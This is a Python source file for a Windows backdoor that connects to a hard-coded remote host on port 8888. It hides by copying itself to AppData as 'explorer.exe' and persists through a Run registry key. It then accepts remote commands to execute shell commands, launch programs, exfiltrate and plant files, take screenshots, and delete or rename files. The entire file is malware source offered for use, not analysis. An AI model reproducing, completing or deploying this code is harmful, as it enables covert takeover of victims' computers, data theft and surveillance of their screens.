import socket,os,subprocess,shutil,sys,json,base64, pyautogui

class Backdoor:
    def __init__(self, ip, port):
        self.persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def persistent(self):
        file = os.path.environ['appdata']+'\explorer.exe'
        if not os.path.exists(file):
            shutil.copyfile(sys.executable, file)
            subprocess.call('reg add \HKCU\Software\Microsoft\Windows\CurrentVersion\Run /t REG_SZ /v explorer.exe /d "'+file+'"')

    def read_files(self, path):
        with open(path, 'rb')as file:
            return base64.b64encode(file.read())

    def write_files(self, path, content):
        with open(path, 'wb') as file:
            file.write(base64.b64decode(content))
            return '[+] Success'

    def json_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def json_recv(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def change_dir(self, path):
        try:
            os.chdir(path)
            return '[+] path changed to '+str(path)
        except :
            return '[-] Error in change_dir [Client]'

    def open(self, app):
        try:
            subprocess.Popen(app, shell=True)
            return '[+] opened '+str(app)
        except Exception:
            return '[-] Error in open() [Client]'

    def screenshot(self):
        screenshot = pyautogui.screenshot()
        screenshot.save('screen.png')
        return self.read_files('screen.png')

    def exe_cmd(self, command):
        try:
            devnull = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True,stdin=devnull, stderr=devnull)
        except:
            return '[-] Error in exe_cmd())f [Client]'

    def run(self):
        while True:
            command = self.json_recv()
            try:
                if command[0] == 'exit':
                    self.connection.close()
                    sys.exit()
                elif command[0] == 'run':
                    result = self.open(command[1])
                elif command[0] == 'download':
                    result = self.read_files(command[1])
                elif command[0] == 'upload':
                    result = self.write_files(command[1], command[2])
                elif command[0] == 'ch':
                    result = self.change_dir(command[1])
                elif command[0] == 'screenshot':
                    result = self.screenshot()
                elif command[0] == 'remove':
                    os.remove(command[1])
                    result = '[+] Removed '+str(command[1])
                elif command[0] == 'rename':
                    os.rename(command[1],command[2])
                    result = '[+] Renamed '+str(command[1])+'to '+str(command[2])
                else:
                    result = self.exe_cmd(command)
            except Exception:
                result = '[-] Error in run() [Client]'

            self.json_send(result)
            if command[0] == 'screenshot':
                os.remove('screen.png')
#file = sys._MEIPASS+'\explorer.exe'
#subprocess.Popen(file, shell=True)
try:
    backdoor = Backdoor('192.168.1.25',8888)
    backdoor.run()
except:
    sys.exit()
